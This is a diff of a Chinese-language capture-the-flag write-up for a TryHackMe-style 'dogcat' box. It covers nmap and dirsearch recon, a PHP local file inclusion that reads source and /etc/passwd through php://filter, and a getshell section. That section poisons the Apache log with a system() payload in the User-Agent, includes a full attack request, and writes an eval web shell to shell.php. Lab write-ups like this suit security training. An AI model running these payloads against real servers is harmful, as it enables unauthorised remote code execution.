@@ -1,10 +1,10 @@
 # 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme]
-└─#  nmap -sV -Pn 10.10.1.149                          
+└─#  nmap -sV -Pn 10.10.228.190                         
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 01:40 EDT
-Nmap scan report for 10.10.1.149
+Nmap scan report for 10.10.199.124
 Host is up (0.31s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
@@ -20,7 +20,7 @@ Nmap done: 1 IP address (1 host up) scanned in 39.93 seconds
 # 目录爆破，只有cat和dog两个已知文件夹，各有10张图片
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─#  python3 dirsearch.py -u "http://10.10.1.149" -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100
+└─#  python3 dirsearch.py -u "http://10.10.199.124" -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -29,12 +29,12 @@ Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521
 
 Error Log: /root/dirsearch/logs/errors-21-09-23_01-46-47.log
 
-Target: http://10.10.1.149
+Target: http://10.10.199.124
 
 [01:46:48] Starting: 
 [01:46:49] 200 -  418B  - /
-[01:47:04] 301 -  311B  - /cats  ->  http://10.10.1.149/cats/
-[01:47:10] 301 -  311B  - /dogs  ->  http://10.10.1.149/dogs/
+[01:47:04] 301 -  311B  - /cats  ->  http://10.10.199.124/cats/
+[01:47:10] 301 -  311B  - /dogs  ->  http://10.10.199.124/dogs/
 [01:52:19] 403 -  277B  - /server-status  
 ```
 
@@ -44,11 +44,11 @@ Target: http://10.10.1.149
 $dir = $_GET["view"] .'.php';
 include($dir);
 ```
-http://10.10.1.149/?view=dog
+http://10.10.199.124/?view=dog
 
 
 构造payload
-```http://10.10.1.149/?view=php://filter/read=convert.base64-encode/resource=./cat/../index```
+```http://10.10.199.124/?view=php://filter/read=convert.base64-encode/resource=./cat/../index```
 
 得到index.php的源码base64字符串
 ```
@@ -96,7 +96,7 @@ PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAg
 大概与我们猜想的一致，需要留意``` $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';```这行代码，文件后缀其实是可以指定的，不指定默认是```.php```
 
 # 构造参数读取/etc/passwd文件
-```http://10.10.1.149/?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=&```
+```http://10.10.199.124/?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=&```
 
 # 解密为
 ```
@@ -120,8 +120,47 @@ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 ```
+居然没有普通用户
 
 
-http://10.10.1.149/?view=php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+/resource=./cat/../shell.php
+找到access.log路径
+```
+?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../var/log/apache2/access.log&ext=&
+```
 
-php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php
+base64decode完后查看log记录
+```
+127.0.0.1 - - [03/Nov/2021:08:42:41 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
+127.0.0.1 - - [03/Nov/2021:08:43:15 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
+127.0.0.1 - - [03/Nov/2021:08:43:52 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
+10.13.21.169 - - [03/Nov/2021:08:44:01 +0000] "GET /?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=& HTTP/1.1" 200 1071 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+10.13.21.169 - - [03/Nov/2021:08:44:01 +0000] "GET /style.css HTTP/1.1" 200 662 "http://10.10.199.124/?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=&" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+10.13.21.169 - - [03/Nov/2021:08:44:02 +0000] "GET /favicon.ico HTTP/1.1" 404 455 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+```
+
+由记录可见，记录了url和user-agent，我们打开burpsuite，把下面代码放到user-agent，验证是否存在文件解析漏洞
+```<?php phpinfo(); ?>```
+点击页面触发，可以显示php版本信息，证明漏洞存在
+```?view=./cat/../../../../var/log/apache2/access.log&ext=&```
+
+# getshell
+
+```
+GET /?view=./cat/../../../../var/log/apache2/access.log&ext=&cmd=ls HTTP/1.1
+Host: 10.10.228.190
+User-Agent: "<?php system($_GET['cmd']);?>"
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+```
+
+
+<?php system($_GET['cmd']);?>
+
+
+
+
+echo "<?php eval(@$_POST[a]); ?>" >  /var/www/html/shell.php
